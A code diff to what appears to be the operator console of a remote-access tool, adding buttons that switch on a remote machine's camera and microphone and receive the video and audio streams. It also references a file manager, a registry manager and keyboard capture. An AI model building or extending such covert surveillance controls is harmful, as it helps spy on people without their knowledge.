@@ -1,5 +1,9 @@
 import asyncio
+from camera import *
 from pynput import keyboard
+from microphone import *
+
+
 
 operation_map = {
     "fileManager": "File manager opened",
@@ -74,16 +78,26 @@ async def regmanager(GUI):
 
 
 async def opencamera(GUI):
-    # 这里放具体的操作
     try:
-        operation = "Hello, Server!"
-        GUI.connections["openCamera"]["writer"].write(operation.encode())
-        await GUI.connections["openCamera"]["writer"].drain()
-        GUI.append_log(f"[*] Sent operation: {operation}")
+        if GUI.openCamera.text() == "开启摄像头":
+            GUI.camera_check =True
+            operation = "Hello, Server!"
+            GUI.connections["openCamera"]["writer"].write(operation.encode())
+            await GUI.connections["openCamera"]["writer"].drain()
+            GUI.append_log(f"[*] Sent operation: {operation}")
 
-        GUI.append_log("[*] Waiting for response...")
-        response = await GUI.connections["openCamera"]["reader"].read(1024)
-        GUI.append_log(f"[*] Received response: {response.decode('utf-8')}")
+            GUI.append_log("[*] Waiting for response...")
+            response = await GUI.connections["openCamera"]["reader"].read(1024)
+            GUI.append_log(f"[*] Received response: {response.decode('utf-8')}")
+
+            # 切换按钮文本为 "关闭摄像头"
+            GUI.openCamera.setText("关闭摄像头")
+            # 启动视频流接收
+            await receive_video_stream(GUI)
+        else:
+            # 停止视频流
+            GUI.camera_check = False
+            GUI.openCamera.setText("开启摄像头")
     except Exception as e:
         GUI.append_log(f"[!] Unexpected error: {e}")
 
@@ -91,14 +105,26 @@ async def opencamera(GUI):
 async def openmicrophone(GUI):
     # 这里放具体的操作
     try:
-        operation = "Hello, Server!"
-        GUI.connections["openMicrophone"]["writer"].write(operation.encode())
-        await GUI.connections["openMicrophone"]["writer"].drain()
-        GUI.append_log(f"[*] Sent operation: {operation}")
+        if GUI.openMicrophone.text() == "开启麦克风":
+            GUI.microphone_check = True
+            operation = "Hello, Server!"
+            GUI.connections["openMicrophone"]["writer"].write(operation.encode())
+            await GUI.connections["openMicrophone"]["writer"].drain()
+            GUI.append_log(f"[*] Sent operation: {operation}")
 
-        GUI.append_log("[*] Waiting for response...")
-        response = await GUI.connections["openMicrophone"]["reader"].read(1024)
-        GUI.append_log(f"[*] Received response: {response.decode('utf-8')}")
+            GUI.append_log("[*] Waiting for response...")
+            response = await GUI.connections["openMicrophone"]["reader"].read(1024)
+            GUI.append_log(f"[*] Received response: {response.decode('utf-8')}")
+
+            # 切换按钮文本为 "关闭麦克风"
+            GUI.openMicrophone.setText("关闭麦克风")
+            # 启动语音流接收
+            await receive_voice_stream(GUI)
+        else:
+            # 停止语音流
+            GUI.microphone_check = False
+            GUI.openMicrophone.setText("开启麦克风")
+
     except Exception as e:
         GUI.append_log(f"[!] Unexpected error: {e}")
 
